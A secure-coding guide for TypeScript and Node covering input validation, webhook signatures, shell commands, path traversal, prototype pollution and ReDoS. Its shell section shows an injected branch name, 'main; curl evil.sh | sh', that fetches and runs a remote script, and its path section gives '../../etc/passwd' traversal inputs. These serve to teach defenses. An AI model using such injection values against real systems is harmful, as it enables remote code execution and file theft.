# Untrusted input in TypeScript and Node

Read this when code accepts data from outside the process (HTTP bodies, query strings, headers, webhooks, queue messages, environment, files, third-party APIs) or passes it to a shell, the filesystem, object keys or a regex.

Authorization, SSRF, sessions and threat modelling are in security-engineering. This file covers the TypeScript and Node mechanics that make those controls hold.

## Request bodies

The pattern for any write endpoint:

1. Limit the body size in the parser (`express.json({ limit })`, the framework's equivalent) from configuration.
2. Parse with a strict schema. Fields the client may not set (owner, tenant, role, price, status) are not in the schema at all.
3. Take identity and tenant from the authenticated session.
4. Load the target with the tenant or owner in the `where` clause, and treat "not found" and "not yours" the same.
5. Write only fields from the parsed output.

```ts
const UpdateProfile = z.strictObject({
  displayName: z.string().trim().min(1).max(limits.displayNameMax).optional(),
  locale: z.enum(SUPPORTED_LOCALES).optional(),
});

app.patch("/me/profile", async (req, res) => {
  const parsed = UpdateProfile.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid_request", issues: z.flattenError(parsed.error) });
  }
  const profile = await db.profile.update({
    where: { userId: req.session.userId },
    data: parsed.data,
  });
  res.json(toProfileDto(profile));
});
```

In Prisma `data`, a field set to `undefined` means "leave unchanged", which is what a PATCH wants. In `where`, `undefined` means "no filter", which is how `deleteMany({ where: { tenantId: undefined } })` empties a table. Validate every filter value as present before the query, or enable `strictUndefinedChecks` and use `Prisma.skip` where omission is intended.

### One schema per trust level

A shared `UserSchema` used by both the admin endpoint and the self-service endpoint gives the self-service endpoint the `role` field. Define the client-facing schema separately, or derive it with `.pick` / `.omit` and review the derived shape. In Zod 4, `.merge` is deprecated in favour of `.extend`.

### Query strings and headers

- A repeated key (`?id=1&id=2`) arrives as an array in most parsers. Schema-validate query objects like bodies.
- Numbers: `z.coerce.number()` turns `""` into `0`. Use `z.string().regex(DIGITS).transform(Number).pipe(z.number().int().min(1).max(limits.pageSizeMax))` or reject empty strings before coercing.
- Booleans: `z.stringbool()` in Zod 4. `z.coerce.boolean()` and `Boolean(value)` make `"false"` true.
- Headers such as `X-Forwarded-For`, `X-User-Id` or `X-Tenant` are client-controlled unless a proxy you control strips and sets them. Trust them only behind that proxy, and configure the framework's trusted-proxy setting instead of parsing them yourself.

### Third-party responses

Parse what you read, and let the rest through the default strip so a new upstream field does not break you. Do not use `z.strictObject` here. Do use it for anything you persist or act on with authority. A response that fails parsing is an upstream error, logged with the upstream name and status, not a 500 with the Zod issue list sent to your client.

## Environment and configuration

```ts
const MIN_SECRET_LENGTH = 32;

const Env = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]),
  DATABASE_URL: z.url(),
  SESSION_SECRET: z.string().min(MIN_SECRET_LENGTH),
  UPSTREAM_TIMEOUT_MS: z.coerce.number().int().positive(),
  REQUIRE_MFA: z.stringbool(),
});

export type Config = z.infer<typeof Env>;

export function loadConfig(source: NodeJS.ProcessEnv = process.env): Readonly<Config> {
  const parsed = Env.safeParse(source);
  if (!parsed.success) {
    // Print which keys failed, never their values.
    const keys = parsed.error.issues.map((i) => i.path.join("."));
    throw new Error(`invalid configuration: ${keys.join(", ")}`);
  }
  return Object.freeze(parsed.data);
}
```

- `z.object`, not strict: the environment holds many unrelated variables.
- No `.default()` on secrets, signing keys, allowed origins, TLS or auth switches. A default there means production can boot with the development value.
- Call `loadConfig` once in the entry point and pass the result down. Modules that read `process.env` at import time make tests order-dependent and hide which settings a module needs.
- Log the configuration only through an allowlist of non-secret keys.

## Webhooks

- Verify the signature over the raw bytes. Re-serializing a parsed body changes whitespace and key order and the signature no longer matches, which tempts people to disable verification. In Express, mount `express.raw({ type: "application/json", limit })` on the webhook route only.
- Compare in constant time with the length handled (below).
- If the provider signs a timestamp, reject events outside the tolerance the provider documents, and dedupe on the event id with a unique constraint, since providers redeliver.
- Parse the body with a schema after verification, acknowledge quickly, and do the work through a queue or outbox so a slow handler does not trigger redelivery storms.

## Constant-time comparison and randomness

`crypto.timingSafeEqual` throws a `RangeError` when the inputs differ in byte length. With an attacker-supplied value, an unguarded call is a 500 on every malformed request, and a crash where the error escapes a callback.

```ts
import { createHmac, timingSafeEqual } from "node:crypto";

export function hasValidSignature(rawBody: Buffer, signatureHex: string, secret: string): boolean {
  const expected = createHmac("sha256", secret).update(rawBody).digest();
  // Buffer.from(hex) stops at the first invalid character, so malformed input comes out shorter.
  const given = Buffer.from(signatureHex, "hex");
  return given.length === expected.length && timingSafeEqual(given, expected);
}
```

The length check leaks only the digest length, which is public. For tokens of variable length, compare HMACs or SHA-256 digests of both sides instead. Workers use `crypto.subtle.timingSafeEqual` (`references/runtimes.md`).

Tokens, session ids, reset codes and invite codes come from `crypto.randomBytes`, `crypto.randomUUID` or `crypto.getRandomValues`; numeric codes from `crypto.randomInt`. `Math.random` output can be predicted from earlier outputs. Store only a hash of long-lived tokens.

## Shell commands

```ts
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

// Before: branch = "main; curl evil.sh | sh" runs a second command
exec(`git log --format=%H ${branch}`, callback);

// After: no shell; --end-of-options stops git reading "--output=/etc/x" as a flag
const REF_NAME = /^[A-Za-z0-9._/-]{1,200}$/;
if (!REF_NAME.test(branch)) throw new ValidationError("invalid branch name");
const { stdout } = await execFileAsync("git", ["log", "--format=%H", "--end-of-options", branch], {
  cwd: repoPath,
  timeout: config.gitTimeoutMs,
  maxBuffer: config.gitMaxOutputBytes,
});
```

- `exec`, `execSync` and `spawn`/`execFile` with `shell: true` all interpret the string. Escaping helpers are not a substitute for the argument array.
- Without a shell, a value starting with `-` can still be read as an option by the program. End options with `--` (or `--end-of-options` for git revisions) and validate against the argument's grammar.
- `timeout` and `maxBuffer` bound a hung or chatty child. Exceeding `maxBuffer` (1 MiB by default for `exec` and `execFile`) terminates the child, which surfaces as an error you need to handle.

## File paths

```ts
import path from "node:path";

export function resolveInside(root: string, untrusted: string): string {
  const base = path.resolve(root);
  const target = path.resolve(base, untrusted);
  const rel = path.relative(base, target);
  if (rel === "" || rel === ".." || rel.startsWith(`..${path.sep}`) || path.isAbsolute(rel)) {
    throw new ForbiddenError("path outside storage root");
  }
  return target;
}
```

- `path.join(root, "../../etc/passwd")` escapes; `path.resolve(root, "/etc/passwd")` discards `root`; `target.startsWith(root)` accepts `/srv/uploads-evil` for root `/srv/uploads`.
- If users can create symlinks inside the root (archive extraction, shared volumes), check `fs.realpath` of the target as well.
- Better than any check: store files under generated names and look them up by id with an ownership check. Keep the user's filename as metadata, and sanitize it for `Content-Disposition`.

## Prototype pollution and user-keyed objects

Three shapes to look for:

1. Recursive merge, deep set or query-string parsing into nested objects with user-controlled keys. A key of `__proto__`, or `constructor` followed by `prototype`, writes to `Object.prototype`, and every object in the process gains the property (`isAdmin`, `shell`, `env`).
2. `Object.assign(target, JSON.parse(body))`. `JSON.parse` creates an own property named `__proto__`; `Object.assign` then assigns it through the setter and replaces `target`'s prototype. Object spread defines an own property instead and is not affected.
3. Lookups by user key into plain objects:

```ts
// Before: type=constructor returns Object.prototype.constructor, which is truthy and callable
const handlers: Record<string, EventHandler> = { "invoice.paid": onPaid, "invoice.voided": onVoided };
const handler = handlers[event.type];
if (!handler) throw new ValidationError("unknown event type");

// After: validate the key against the known set, then use a Map
const EventType = z.enum(["invoice.paid", "invoice.voided"]);
const handlers = new Map<z.infer<typeof EventType>, EventHandler>([
  ["invoice.paid", onPaid],
  ["invoice.voided", onVoided],
]);
```

Fixes, in order of preference: validate the shape with a schema before anything merges it; use `Map` or `Object.create(null)` for dictionaries keyed by input; check `Object.hasOwn(obj, key)` before reading; skip `__proto__`, `constructor` and `prototype` in any merge you own. Node's `--disable-proto=delete` removes the `__proto__` accessor as defense in depth. Old versions of deep-merge utilities have had pollution CVEs, so audit their versions.

## Regular expressions

A backtracking regex over untrusted input can take seconds or minutes on one crafted string, blocking the whole process.

- Patterns to flag: a quantified group containing a quantifier (`(a+)+`, `(\s*\w+)*`), alternation whose branches overlap under a quantifier (`(\w|\d)+`), and an unanchored quantifier before a suffix that can fail, which the engine retries from every start position (`/\s+$/` on a long run of spaces followed by a letter is quadratic).
- Cap the input length before matching, at the field's real maximum. Most ReDoS needs thousands of characters.
- Rewrite so each character can be consumed only one way, or use a linear-time engine such as the `re2` package for user-supplied or complex patterns.
- Never build a `RegExp` from user input without escaping it, and prefer `includes` or `startsWith` when no pattern is needed.
- `str.replace("x", "y")` with a string pattern replaces only the first occurrence. Sanitizers written this way let the second `<` through. Use `replaceAll` or a real encoder.

## Errors at the HTTP boundary

- Map errors to responses with a stable machine code and a generic message. Never return `err.message`, stack traces, SQL, file paths or upstream response bodies.
- Branch on `err.code` or a discriminant, not only `instanceof`, which fails across realms and duplicate package copies.
- Normalize unknown throws before logging:

```ts
export function toError(value: unknown): Error {
  return value instanceof Error ? value : new Error("non-Error value thrown", { cause: value });
}
```

- In Express 4, an `async` handler's rejection bypasses the error middleware. Wrap handlers or upgrade to Express 5, which forwards rejected promises to `next`.
